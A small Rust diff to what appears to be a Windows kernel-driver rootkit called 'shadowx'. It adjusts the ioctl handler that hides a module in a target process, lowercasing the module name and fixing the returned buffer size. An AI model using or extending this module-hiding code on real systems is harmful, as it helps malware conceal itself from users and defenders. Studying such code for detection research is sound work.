@@ -8,8 +8,9 @@ use {
 
 use {
     crate::utils::{
+        get_input_buffer, 
+        get_output_buffer,
         ioctls::IoctlManager,
-        get_input_buffer, get_output_buffer
     },
     common::{
         ioctls::{ENUMERATE_MODULE, HIDE_MODULE}, 
@@ -68,12 +69,12 @@ pub fn register_module_ioctls(ioctls: &mut IoctlManager) {
         unsafe {
             // Get the target module information from the input buffer.
             let target = get_input_buffer::<TargetModule>(stack)?;
-
+            
             // Hide the module based on the PID and module name.
-            let status = shadowx::Module::hide_module((*target).pid, &(*target).module_name)?;
+            let status = shadowx::Module::hide_module((*target).pid, &(*target).module_name.to_lowercase())?;
 
             // Update IoStatus to indicate success.
-            (*irp).IoStatus.Information = size_of::<ModuleInfo>() as u64;
+            (*irp).IoStatus.Information = size_of::<TargetModule>() as u64;
             Ok(status)
         }
     }));
